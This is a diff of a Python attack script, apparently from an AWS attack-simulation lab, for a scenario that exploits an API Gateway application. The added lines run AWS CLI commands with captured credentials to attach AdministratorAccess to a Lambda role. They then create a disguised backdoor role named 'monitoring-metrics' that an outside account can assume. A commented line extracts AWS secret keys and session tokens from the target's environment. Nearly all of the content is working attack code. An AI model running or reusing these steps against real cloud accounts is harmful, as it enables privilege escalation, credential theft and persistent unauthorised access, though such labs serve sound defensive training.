@@ -137,7 +137,7 @@ def scenario_2_execute():
         data = json.load(file)
 
     API_GW_URL = data["apigateway-rest-endpoint"]
-    LAMBDA_ROLE_NAME = data["lambda-role name"]
+    LAMBDA_ROLE_NAME = data["lambda-role-name"]
 
     print(colored("Exploiting the Application on API GW", color="red"))
     loading_animation()
@@ -158,7 +158,18 @@ def scenario_2_execute():
     print(colored("PrivEsc possible through this credential, Escalating role privileges", color="red"))
     loading_animation()
     print("-"*30)
+    subprocess.call(""+creds+" && aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --role-name "+LAMBDA_ROLE_NAME+"", shell=True)
     
+    #Update Creds
+    #subprocess.call("curl '"+API_GW_URL+"?query=env' | grep -e AWS_ACCESS_KEY_ID -e AWS_SECRET_ACCESS_KEY -e AWS_SESSION_TOKEN >> updated_token.txt", shell=True)
+    #creds = "export $(grep -e AWS_ACCESS_KEY_ID -e AWS_SECRET_ACCESS_KEY -e AWS_SESSION_TOKEN updated_token.txt)"
+    sleep(60)
+    subprocess.call("curl '"+API_GW_URL+"?query=ping'", shell=True)
+    print(colored("Creating a Backdoor Role which can be assumed from custom AWS account", color="red"))
+    loading_animation()
+    print("-"*30)
+    subprocess.call(""+creds+" && aws iam create-role --role-name monitoring-metrics --assume-role-policy-document file://infra/scenario-2/assume-role-trust-policy.json", shell=True)
+    subprocess.call(""+creds+" && aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --role-name monitoring-metrics", shell=True)
 
 
 
